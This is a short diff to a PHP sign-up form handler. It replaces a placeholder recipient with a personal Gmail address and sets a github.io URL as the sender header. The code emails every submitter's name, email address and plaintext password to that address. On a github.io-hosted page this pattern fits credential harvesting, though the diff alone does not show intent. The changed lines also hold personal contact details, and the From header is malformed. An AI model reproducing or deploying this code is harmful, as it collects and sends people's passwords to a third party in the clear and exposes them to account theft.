@@ -6,10 +6,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $password = htmlspecialchars($_POST['password']);
 
     // Email details
-    $to = "your-email@example.com"; // Replace with your email
+    $to = "indiangamer.1291@gmail.com"; // Replace with your email
     $subject = "New Sign Up Information";
     $message = "Name: $name\nEmail: $email\nPassword: $password";
-    $headers = "From: noreply@yourdomain.com"; // Replace with your domain
+    $headers = "From: https://ninja-1234.github.io"; // Replace with your domain
 
     // Send the email
     if (mail($to, $subject, $message, $headers)) {
